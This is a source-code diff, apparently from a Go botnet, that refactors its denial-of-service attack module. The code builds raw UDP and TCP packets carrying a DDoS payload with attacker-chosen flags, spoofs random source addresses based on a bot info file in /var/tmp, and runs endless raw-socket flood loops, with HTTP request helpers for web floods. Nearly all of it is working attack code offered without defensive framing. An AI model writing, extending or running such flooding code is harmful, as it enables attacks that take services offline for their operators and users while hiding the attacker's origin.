@@ -51,6 +51,11 @@ func setupIPv4(srcv4, dstv4 net.IP, protov4 layers.IPProtocol) *layers.IPv4 {
 	return ipv4
 }
 
+func setupHTTP(method, url, path string, body io.Reader) (*http.Client, *http.Request, error) {
+	httpReq, err := http.NewRequest(method, url+path, body)
+	return &http.Client{}, httpReq, err
+}
+
 func (a *Attack) setupUDP(udpSrc, udpDst *net.UDPAddr) []byte {
 	sBuffer, sOpt := setupOpt()
 	udpv4 := setupIPv4(udpSrc.IP.To4(), udpDst.IP.To4(), layers.IPProtocolUDP)
@@ -59,7 +64,7 @@ func (a *Attack) setupUDP(udpSrc, udpDst *net.UDPAddr) []byte {
 		DstPort: layers.UDPPort(udpDst.Port),
 	}
 	udpLayers.SetNetworkLayerForChecksum(udpv4)
-	gopacket.SerializeLayers(sBuffer, *sOpt, udpv4, udpLayers, gopacket.Payload(a.ddosPayload))
+	gopacket.SerializeLayers(sBuffer, *sOpt, udpv4, udpLayers, gopacket.Payload(a.DDOS_PAYLOAD))
 	return sBuffer.Bytes()
 }
 
@@ -71,15 +76,15 @@ func (a *Attack) setupTCP(tcpSrc, tcpDst *net.TCPAddr) []byte {
 		SrcPort: layers.TCPPort(tcpSrc.Port),
 		DstPort: layers.TCPPort(tcpDst.Port),
 		Window:  uint16(setWin),
-		SYN:     a.synFlag,
-		ACK:     a.ackFlag,
-		RST:     a.rstFlag,
-		PSH:     a.pshFlag,
-		FIN:     a.finFlag,
-		URG:     a.urgFlag,
+		SYN:     a.SYN_FLAG,
+		ACK:     a.ACK_FLAG,
+		RST:     a.RST_FLAG,
+		PSH:     a.PSH_FLAG,
+		FIN:     a.FIN_FLAG,
+		URG:     a.URG_FLAG,
 	}
 	tcpLayers.SetNetworkLayerForChecksum(tcpv4)
-	gopacket.SerializeLayers(sBuffer, *sOpt, tcpv4, tcpLayers, gopacket.Payload(a.ddosPayload))
+	gopacket.SerializeLayers(sBuffer, *sOpt, tcpv4, tcpLayers, gopacket.Payload(a.DDOS_PAYLOAD))
 	return sBuffer.Bytes()
 }
 
@@ -92,25 +97,21 @@ func (a *Attack) randDstPort() int {
 
 func (a *Attack) randSrcIP() string {
 	if a.srcAddr == "-r" {
-		var randArr []string
+		var srcArr []string
 		getIP := execComd("tail", "-1", "/var/tmp/"+fileName(true))
 		manageGetIP := strings.Split(getIP, ".")
 
-		manageSrcRange := func(loopTimes, rtnElems, ipElems int) string {
+		srcRange := func(times, elements, end int) string {
 			/*
-				loop times 4 --> xxx.xxx.xxx.xxx
-				loop times 3 --> 123.xxx.xxx.xxx
-				loop times 2 --> 123.123.xxx.xxx
-				loop times 1 --> 123.123.123.xxx
+				loop time 4 --> xxx.xxx.xxx.xxx
+				loop time 3 --> 123.xxx.xxx.xxx
+				loop time 2 --> 123.123.xxx.xxx
+				loop time 1 --> 123.123.123.xxx
 			*/
-			if loopTimes < 4 {
-				randArr = append(randArr, strings.Join(manageGetIP[0:ipElems], "."), ".")
+			if times < 4 {
+				srcArr = append(srcArr, strings.Join(manageGetIP[0:end], "."), ".")
 			}
-			for i := 1; i <= loopTimes; i++ {
-				randArr = append(randArr, genRange(255, 0), ".")
-			}
-			randArr[len(randArr)-1] = ""
-			return strings.Join(randArr[0:rtnElems], "")
+			return manageRange(srcArr, times, elements)
 		}
 		convIP := convInt(manageGetIP[0])
 
@@ -118,23 +119,18 @@ func (a *Attack) randSrcIP() string {
 			If The bot info file is not found, then do a full randomization (worst case).
 		*/
 		if getIP == "Fail to execute command!!!" {
-			return manageSrcRange(4, 7, 0)
+			return srcRange(4, 7, 0)
 		}
 
 		if convIP < 127 || (convIP >= 225 && convIP <= 239) || (convIP >= 240 && convIP <= 250) {
-			return manageSrcRange(3, 7, 1)
+			return srcRange(3, 7, 1)
 		} else if convIP >= 128 && convIP <= 191 {
-			return manageSrcRange(2, 5, 2)
+			return srcRange(2, 5, 2)
 		} else if convIP >= 193 && convIP <= 223 {
-			return manageSrcRange(1, 4, 3)
+			return srcRange(1, 4, 3)
 		}
 	}
 	return a.srcAddr
-}
-
-func setupHTTP(method, url, header string, body io.Reader) (*http.Client, *http.Request, error) {
-	httpReq, err := http.NewRequest(method, url+header, body)
-	return &http.Client{}, httpReq, err
 }
 
 func (a *Attack) getRequest() {
@@ -169,7 +165,7 @@ func (a *Attack) postRequest() {
 	}
 }
 
-func (a *Attack) udpPacket() {
+func (a *Attack) UDP_PACKET() {
 	conn := rawSocket(syscall.IPPROTO_UDP)
 	for {
 		/*
@@ -203,7 +199,7 @@ func (a *Attack) udpPacket() {
 	}
 }
 
-func (a *Attack) tcpPacket() {
+func (a *Attack) TCP_PACKET() {
 	conn := rawSocket(syscall.IPPROTO_TCP)
 	for {
 		/*
